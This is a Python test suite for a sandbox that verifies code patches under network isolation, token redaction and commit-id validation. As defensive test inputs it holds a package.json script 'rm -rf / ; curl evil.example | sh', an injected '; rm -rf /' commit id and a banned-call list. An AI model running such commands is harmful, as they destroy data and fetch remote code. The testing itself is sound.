"""Sandbox layer tests. NOTHING here executes any command: backends are scripted, and the Modal adapter is tested against a fake SDK.
The real Modal path has not been exercised against live Modal (no credentials in this repository's environment).
Run: cd apps/ai && INTERNAL_SECRET=x .venv/bin/python -m unittest -v"""
import asyncio
import os
import unittest
from unittest import mock

import sandbox
from sandbox import backends as B
from sandbox.backends import ModalBackend, ScriptedBackend, get_backend
from sandbox.detect import detect, is_test_path, patch_files, split_patch
from sandbox.parse import parse_counts
from sandbox.types import CommandResult, SandboxError, SessionSpec, estimate_cost
from sandbox.verify import RepoSource, redact, verify_change

NODE_FILES = ["package.json", "package-lock.json", "src/app.js", "test/app.test.js"]
PKG = '{"scripts":{"test":"node --test","lint":"eslint .","build":"tsc"}}'
PATCH_BOTH = ("diff --git a/test/app.test.js b/test/app.test.js\n--- a/test/app.test.js\n+++ b/test/app.test.js\n@@ -1 +1,2 @@\n x\n+y\n"
              "diff --git a/src/app.js b/src/app.js\n--- a/src/app.js\n+++ b/src/app.js\n@@ -1 +1,2 @@\n a\n+b\n")
PATCH_SRC = "diff --git a/src/app.js b/src/app.js\n--- a/src/app.js\n+++ b/src/app.js\n@@ -1 +1,2 @@\n a\n+b\n"


def script(files=NODE_FILES, pkg=PKG, **by_substring):
    """by_substring maps a fragment of the command to an exit code / CommandResult; a list is consumed in order (first call, second call...)."""
    calls: dict = {}

    def run(session, cmd):
        joined = " ".join(cmd)
        if "ls-files" in joined:
            return CommandResult(cmd, 0, stdout="\n".join(files))
        if cmd[0] == "cat" and cmd[1].endswith("package.json"):
            return CommandResult(cmd, 0, stdout=pkg)
        for frag, res in by_substring.items():
            if frag.replace("_", " ") in joined:
                if isinstance(res, list):
                    n = calls.get(frag, 0)
                    calls[frag] = n + 1
                    res = res[min(n, len(res) - 1)]
                return res(cmd) if callable(res) else res
        return 0
    return run


def go(be, repo=None, patch=PATCH_SRC):
    return asyncio.run(verify_change(be, repo or RepoSource(tarball=b"tgz"), patch))


class DetectTest(unittest.TestCase):
    def test_node_uses_ci_with_a_lockfile_and_only_scripts_that_exist(self):
        p = detect(NODE_FILES, PKG)
        self.assertEqual(p.install, [["npm", "ci", "--no-audit", "--no-fund"]])
        self.assertEqual((p.test, p.lint, p.build), (["npm", "test", "--silent"], ["npm", "run", "lint", "--silent"], ["npm", "run", "build", "--silent"]))
        p = detect(["package.json"], '{"scripts":{"test":"echo \\"Error: no test specified\\" && exit 1"}}')
        self.assertEqual(p.install[0][:2], ["npm", "install"])
        self.assertIsNone(p.test)
        self.assertIsNone(p.lint)

    def test_python_installs_requirements_and_needs_real_tests_to_run_pytest(self):
        p = detect(["requirements.txt", "app.py", "tests/test_app.py"])
        self.assertEqual(p.ecosystem, "python")
        self.assertTrue(any("-r" in c for c in p.install))
        self.assertEqual(p.test[:3], ["python3", "-m", "pytest"])
        self.assertIsNone(detect(["requirements.txt", "app.py"]).test)

    def test_nothing_recognised_means_none_and_commands_never_come_from_the_repo_text(self):
        self.assertIsNone(detect(["index.html", "style.css"]))
        p = detect(["package.json"], '{"scripts":{"test":"rm -rf / # ; curl evil.example | sh"}}')
        self.assertEqual(p.test, ["npm", "test", "--silent"])  # the runner is ours; only the project's own script body runs, inside the sandbox

    def test_malformed_package_json_is_survivable(self):
        self.assertIsNone(detect(["package.json"], "{not json").test)

    def test_test_paths_and_patch_splitting(self):
        for p in ("test/a.js", "tests/b.py", "src/__tests__/c.ts", "x.test.ts", "pkg/test_mod.py", "a_test.go"):
            self.assertTrue(is_test_path(p), p)
        for p in ("src/app.js", "contest/readme.md", "latest.js"):
            self.assertFalse(is_test_path(p), p)
        t, r = split_patch(PATCH_BOTH)
        self.assertIn("test/app.test.js", t)
        self.assertNotIn("src/app.js", t)
        self.assertIn("src/app.js", r)
        self.assertEqual(patch_files(PATCH_BOTH), ["test/app.test.js", "src/app.js"])


class ParseTest(unittest.TestCase):
    def test_common_runners(self):
        self.assertEqual(parse_counts("3 passed, 1 failed, 2 skipped in 0.5s"), {"passed": 3, "failed": 1, "skipped": 2})
        self.assertEqual(parse_counts("Tests:       1 failed, 7 passed, 8 total"), {"passed": 7, "failed": 1})
        self.assertEqual(parse_counts("ℹ tests 5\nℹ pass 5\nℹ fail 0\n"), {"passed": 5, "failed": 0})
        self.assertEqual(parse_counts("  12 passing (40ms)\n  2 failing"), {"passed": 12, "failed": 2})
        self.assertEqual(parse_counts("nothing useful"), {})


class VerifyTest(unittest.TestCase):
    def test_a_good_change_is_verified_in_two_phases_with_the_right_networks(self):
        be = ScriptedBackend(script(**{"npm_test": CommandResult(["npm", "test"], 0, 45.0, stdout="ℹ pass 4\nℹ fail 0\n")}))
        v = go(be, RepoSource(clone_url="https://github.com/o/r.git", token="ghs_SECRET_TOKEN"))
        self.assertEqual(v.status, "verified")
        self.assertEqual(v.ecosystem, "node")
        setup, run = be.sessions
        self.assertEqual(setup.spec.network, "registries+github")
        self.assertEqual((run.spec.network, run.spec.from_snapshot), ("none", "snap-0"))
        self.assertTrue(setup.closed and run.closed)
        self.assertEqual([s.phase for s in v.steps][:2], ["setup", "setup"])
        self.assertIn("tests", [s.label for s in v.steps])
        self.assertEqual(next(s for s in reversed(v.steps) if s.label == "tests").counts["passed"], 4)
        self.assertGreater(v.cost_usd, 0)
        self.assertIn("Verified (4 passed)", v.summary())

    def test_the_clone_credential_exists_only_in_the_setup_phase_and_never_in_evidence(self):
        secret = "ghs_SECRET_TOKEN_123"
        leak = CommandResult(["git", "clone"], 0, stdout=f"cloned using {secret}")
        be = ScriptedBackend(script(**{"git_clone": leak}))
        v = go(be, RepoSource(clone_url="https://github.com/o/r.git", token=secret))
        setup, run = be.sessions
        self.assertTrue(any(secret in str(c["env"]) or "Authorization" in str(c["env"]) for c in setup.commands))      # needed for the clone
        for c in run.commands:
            self.assertNotIn(secret, str(c))
            self.assertEqual(set(c["env"]) - {"CI"}, set())                 # no GIT_* or token variables in the run phase
        for s in v.steps:
            self.assertNotIn(secret, s.output + " ".join(s.cmd))
        self.assertIn("***", next(s for s in v.steps if s.label == "clone").output)
        self.assertNotIn(secret, " ".join(" ".join(c["cmd"]) for sess in be.sessions for c in sess.commands))  # not even in an argument

    def test_a_pinned_commit_is_fetched_exactly_and_the_token_stays_in_the_fetch_environment(self):
        sha = "d" * 40
        secret = "ghs_SECRET_TOKEN_123"
        be = ScriptedBackend(script())
        v = go(be, RepoSource(clone_url="https://github.com/o/r.git", commit=sha, ref="main", token=secret))
        self.assertEqual(v.status, "verified")
        setup = be.sessions[0]
        cmds = [c["cmd"] for c in setup.commands]
        self.assertEqual(cmds[0][:2], ["git", "init"])
        self.assertIn(["git", "-C", "/work", "remote", "add", "origin", "https://github.com/o/r.git"], cmds)
        self.assertIn(["git", "-C", "/work", "fetch", "--quiet", "--depth", "1", "origin", sha], cmds)
        self.assertIn(["git", "-C", "/work", "checkout", "--quiet", "FETCH_HEAD"], cmds)
        self.assertFalse(any(c[:2] == ["git", "clone"] for c in cmds))
        fetch = next(c for c in setup.commands if "fetch" in c["cmd"])
        self.assertIn("Authorization", str(fetch["env"]))                                  # only the network step carries the credential
        self.assertTrue(all(not c["env"] for c in setup.commands if "fetch" not in c["cmd"] and c["cmd"][0] == "git"))
        self.assertNotIn(secret, " ".join(" ".join(c["cmd"]) for s in be.sessions for c in s.commands))
        self.assertEqual(be.sessions[1].spec.network, "none")

    def test_a_malformed_commit_id_is_refused_before_anything_runs(self):
        for bad in ("main", "abc", "x" * 40, "d" * 39, "d" * 40 + "; rm -rf /"):
            be = ScriptedBackend(script())
            v = go(be, RepoSource(clone_url="https://github.com/o/r.git", commit=bad))
            self.assertEqual(v.status, "failed", bad)
            self.assertIn("not a valid commit id", v.reason)
            self.assertFalse(any(c["cmd"][:2] in (["git", "fetch"],) for s in be.sessions for c in s.commands))

    def test_an_uploaded_workspace_gets_registry_access_only(self):
        be = ScriptedBackend(script())
        v = go(be, RepoSource(tarball=b"x"))
        self.assertEqual(be.sessions[0].spec.network, "registries")
        self.assertIn("/tmp/src.tgz", be.sessions[0].files)
        self.assertEqual(v.status, "verified")

    def test_new_tests_must_fail_before_the_fix_and_pass_after(self):
        be = ScriptedBackend(script(**{"npm_test": [0, 1, 0]}))  # before the change: pass; new tests alone: FAIL (good); after the change: pass
        v = go(be, patch=PATCH_BOTH)
        self.assertEqual((v.status, v.red_exit, v.green_exit), ("verified", 1, 0))
        self.assertEqual(v.warnings, [])
        labels = [s.label for s in v.steps if s.phase == "run"]
        self.assertEqual(labels[:5], ["tests (before the change)", "apply the new tests", "tests (new tests only, before the fix)", "apply the change", "tests"])

    def test_new_tests_that_already_pass_without_the_fix_are_called_out(self):
        v = go(ScriptedBackend(script()), patch=PATCH_BOTH)
        self.assertEqual(v.status, "verified")
        self.assertTrue(any("may not test it" in w for w in v.warnings))

    def test_a_patch_that_does_not_apply_fails_and_runs_nothing_more(self):
        be = ScriptedBackend(script(**{"git_-c_user.name=meetpilot_-c_user.email=meetpilot@localhost_apply": CommandResult(["git", "apply"], 1, stderr="error: patch failed: src/app.js:1")}))
        v = go(be)
        self.assertEqual(v.status, "failed")
        self.assertIn("does not apply", v.reason)
        self.assertNotIn("tests", [s.label for s in v.steps])

    def test_failing_tests_lint_or_build_fail_the_change(self):
        for frag, what in (("npm_test", "tests failed"), ("npm_run_lint", "lint"), ("npm_run_build", "build")):
            res = [0, 1] if frag == "npm_test" else 1
            v = go(ScriptedBackend(script(**{frag: res})))
            self.assertEqual(v.status, "failed", frag)
            self.assertIn(what, v.reason)

    def test_tests_that_were_already_failing_are_a_warning_not_an_excuse(self):
        v = go(ScriptedBackend(script(**{"npm_test": [1, 0]})))
        self.assertEqual(v.status, "verified")
        self.assertTrue(any("already failing" in w for w in v.warnings))

    def test_a_timeout_is_a_failure(self):
        t = CommandResult(["npm", "test"], 124, 300, timed_out=True)
        v = go(ScriptedBackend(script(**{"npm_test": [0, t]})))
        self.assertEqual(v.status, "failed")
        self.assertIn("timed out", v.reason)

    def test_install_failure_is_reported_and_no_run_session_is_started(self):
        be = ScriptedBackend(script(**{"npm_ci": 1}))
        v = go(be)
        self.assertEqual(v.status, "failed")
        self.assertIn("installed", v.reason)
        self.assertEqual(len(be.sessions), 1)
        self.assertTrue(be.sessions[0].closed)

    def test_a_fetch_failure_is_reported(self):
        v = go(ScriptedBackend(script(**{"git_clone": 128})), RepoSource(clone_url="https://github.com/o/r.git"))
        self.assertEqual(v.status, "failed")
        self.assertIn("could not be fetched", v.reason)

    def test_no_test_command_or_unknown_project_means_not_tested_never_verified(self):
        v = go(ScriptedBackend(script(pkg='{"scripts":{"build":"tsc"}}')))
        self.assertEqual(v.status, "not_tested")
        self.assertIn("no test command", v.reason)
        v = go(ScriptedBackend(script(files=["index.html"])))
        self.assertEqual(v.status, "not_tested")
        self.assertIn("No supported project type", v.reason)

    def test_sandbox_trouble_is_not_tested_with_the_reason_and_sessions_are_closed(self):
        class Boom(ScriptedBackend):
            async def open(self, spec):
                if spec.network == "none":
                    raise SandboxError("quota exceeded")
                return await super().open(spec)

        be = Boom(script())
        v = go(be)
        self.assertEqual(v.status, "not_tested")
        self.assertIn("quota exceeded", v.reason)
        self.assertTrue(all(s.closed for s in be.sessions))

    def test_off_empty_and_missing_inputs(self):
        self.assertEqual(asyncio.run(verify_change(None, RepoSource(tarball=b"x"), PATCH_SRC)).status, "not_tested")
        self.assertIn("no change", go(ScriptedBackend(script()), patch="  ").reason)
        self.assertIn("No repository", go(ScriptedBackend(script()), RepoSource()).reason)

    def test_huge_output_is_truncated_to_the_tail(self):
        big = CommandResult(["npm", "test"], 0, stdout="x" * 100_000 + "THE END")
        v = go(ScriptedBackend(script(**{"npm_test": big})))
        step = next(s for s in reversed(v.steps) if s.label == "tests")
        self.assertLessEqual(len(step.output), 12_000)
        self.assertTrue(step.output.endswith("THE END"))

    def test_python_projects_use_pytest(self):
        be = ScriptedBackend(script(files=["requirements.txt", "app.py", "tests/test_app.py"]))
        v = go(be)
        self.assertEqual((v.status, v.ecosystem), ("verified", "python"))
        self.assertTrue(any(c["cmd"][:3] == ["python3", "-m", "pytest"] for s in be.sessions for c in s.commands))

    def test_redaction_and_cost_helpers(self):
        self.assertEqual(redact("a ghs_abcdef b", ["ghs_abcdef", None, "x"]), "a *** b")
        self.assertGreater(estimate_cost(60), 0)
        self.assertLess(estimate_cost(60), 0.01)


class ModalAdapterTest(unittest.TestCase):
    """The adapter is exercised against a FAKE modal module that records what would be requested: network policy, runtime, snapshot use."""

    def make_fake(self):
        created = []

        class Proc:
            class _Out:
                async def aread(self_inner): return ""
            def __init__(self, out="", err="", code=0):
                self.stdout = type("S", (), {"read": type("R", (), {"aio": staticmethod(self._aio(out))})})
                self.stderr = type("S", (), {"read": type("R", (), {"aio": staticmethod(self._aio(err))})})
                self.wait = type("W", (), {"aio": staticmethod(self._aio(code))})
                self.stdin = type("I", (), {"write": lambda s, d: None, "write_eof": lambda s: None, "drain": type("D", (), {"aio": staticmethod(self._aio(None))})})()
            @staticmethod
            def _aio(v):
                async def f(*a, **k): return v
                return f

        class Sb:
            def __init__(self): self.execs = []
            exec = None
            async def _exec(self, *a, **k):
                self.execs.append((a, k))
                if k.get("timeout") == 1:
                    raise type("ExecTimeoutError", (Exception,), {})("slow")
                return Proc("out", "err", 0)
            async def _snap(self): return type("Img", (), {"object_id": "im-snap"})()
            async def _term(self): return None

        class Image:
            def __init__(self, ref): self.ref, self.apt = ref, []
            @classmethod
            def from_registry(cls, ref): return cls(ref)
            def apt_install(self, *pk): self.apt = list(pk); return self
            from_id = type("F", (), {"aio": staticmethod(lambda sid: _awaitable(type("Img", (), {"ref": f"snapshot:{sid}", "apt": []})()))})

        async def _awaitable_v(v): return v

        def _awaitable(v):
            return _awaitable_v(v)

        class SandboxCls:
            class create:
                @staticmethod
                async def aio(*args, **kw):
                    sb = Sb()
                    sb.exec = type("E", (), {"aio": staticmethod(sb._exec)})
                    sb.snapshot_filesystem = type("S", (), {"aio": staticmethod(sb._snap)})
                    sb.terminate = type("T", (), {"aio": staticmethod(sb._term)})
                    created.append({"args": args, "kw": kw, "sb": sb})
                    return sb

        class App:
            class lookup:
                @staticmethod
                async def aio(name, create_if_missing=False): return "app"

        fake = type("modal", (), {"Sandbox": SandboxCls, "Image": Image, "App": App})
        return fake, created

    def backend(self):
        fake, created = self.make_fake()
        with mock.patch.dict(os.environ, {"MODAL_TOKEN_ID": "id", "MODAL_TOKEN_SECRET": "secret"}), mock.patch.dict("sys.modules", {"modal": fake}):
            return ModalBackend(), created

    def test_setup_gets_a_registry_allowlist_and_the_run_phase_has_no_network(self):
        be, created = self.backend()

        async def go_():
            await be.open(SessionSpec(network="registries+github"))
            await be.open(SessionSpec(network="registries"))
            await be.open(SessionSpec(network="none", from_snapshot="im-snap"))

        asyncio.run(go_())
        gh, reg, none = (c["kw"] for c in created)
        self.assertIn("registry.npmjs.org", reg["outbound_domain_allowlist"])
        self.assertNotIn("github.com", reg["outbound_domain_allowlist"])
        self.assertIn("github.com", gh["outbound_domain_allowlist"])
        self.assertTrue(none["block_network"])
        self.assertNotIn("outbound_domain_allowlist", none)
        for kw in (gh, reg, none):
            self.assertEqual(kw["runtime"], "gvisor")
            self.assertLessEqual(kw["timeout"], 900)
            self.assertEqual(kw["workdir"], "/work")
        self.assertNotIn("block_network", gh)

    def test_the_run_phase_starts_from_the_snapshot_not_the_base_image(self):
        be, created = self.backend()
        asyncio.run(be.open(SessionSpec(network="none", from_snapshot="im-snap")))
        self.assertEqual(created[0]["kw"]["image"].ref, "snapshot:im-snap")

    def test_setup_image_has_git_node_and_python(self):
        be, created = self.backend()
        asyncio.run(be.open(SessionSpec(network="registries")))
        img = created[0]["kw"]["image"]
        self.assertEqual(img.ref, "node:20-bookworm")
        self.assertIn("git", img.apt)
        self.assertIn("python3", img.apt)

    def test_commands_run_with_their_timeout_and_a_timeout_is_a_result_not_a_crash(self):
        be, created = self.backend()

        async def go_():
            s = await be.open(SessionSpec(network="none"))
            ok = await s.run(["npm", "test"], timeout=60, env={"CI": "true"}, workdir="/work")
            slow = await s.run(["sleep", "9"], timeout=1)
            return ok, slow, await s.snapshot()

        ok, slow, snap = asyncio.run(go_())
        self.assertEqual((ok.exit_code, ok.stdout), (0, "out"))
        self.assertTrue(slow.timed_out)
        self.assertEqual(snap, "im-snap")
        a, k = created[0]["sb"].execs[0]
        self.assertEqual((a, k["timeout"], k["env"], k["workdir"]), (("npm", "test"), 60, {"CI": "true"}, "/work"))

    def test_missing_credentials_or_sdk_are_a_clear_sandbox_error(self):
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(os.path, "exists", lambda p: False):
            with self.assertRaises(SandboxError) as cm:
                ModalBackend()
        self.assertIn("credentials", str(cm.exception))

    def test_modes(self):
        with mock.patch.dict(os.environ, {"SANDBOX_MODE": "off", "MODAL_TOKEN_ID": "x"}):
            self.assertIsNone(get_backend())
        with mock.patch.dict(os.environ, {"SANDBOX_MODE": "mock"}):
            self.assertIsInstance(get_backend(), B.MockBackend)
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertIsNone(get_backend())

    def test_mock_mode_demonstrates_the_flow_offline_and_executes_nothing(self):
        v = asyncio.run(verify_change(B.MockBackend(), RepoSource(tarball=b"x"), PATCH_SRC))
        self.assertEqual(v.status, "verified")


class NoLocalExecutionTest(unittest.TestCase):
    def test_no_sandbox_module_can_run_a_process_on_this_machine(self):
        import pathlib
        for f in pathlib.Path(sandbox.__file__).parent.glob("*.py"):
            src = f.read_text()
            for banned in ("subprocess", "os.system", "os.popen", "pty.", "create_subprocess"):
                self.assertNotIn(banned, src, f"{f.name} must not execute anything locally ({banned})")


if __name__ == "__main__":
    unittest.main()


class StatusEndpointTest(unittest.TestCase):
    def status(self, env):
        with mock.patch.dict(os.environ, {"INTERNAL_SECRET": "x", **env}, clear=False):
            import importlib
            import main
            importlib.reload(main)
            return main.sandbox_status()

    def test_off_modal_without_tokens_and_modal_with_tokens(self):
        for k in ("SANDBOX_MODE", "MODAL_TOKEN_ID", "MODAL_TOKEN_SECRET"):
            os.environ.pop(k, None)
        s = self.status({})
        self.assertEqual((s["mode"], s["configured"], s["live"]), ("off", False, False))
        s = self.status({"SANDBOX_MODE": "modal"})
        self.assertFalse(s["configured"])
        self.assertIn("credentials", s["reason"])
        s = self.status({"SANDBOX_MODE": "modal", "MODAL_TOKEN_ID": "a", "MODAL_TOKEN_SECRET": "b"})
        self.assertEqual((s["configured"], s["live"], s["reason"]), (True, True, ""))
        s = self.status({"SANDBOX_MODE": "mock"})
        self.assertEqual((s["configured"], s["live"]), (True, False))
        for k in ("SANDBOX_MODE", "MODAL_TOKEN_ID", "MODAL_TOKEN_SECRET"):
            os.environ.pop(k, None)
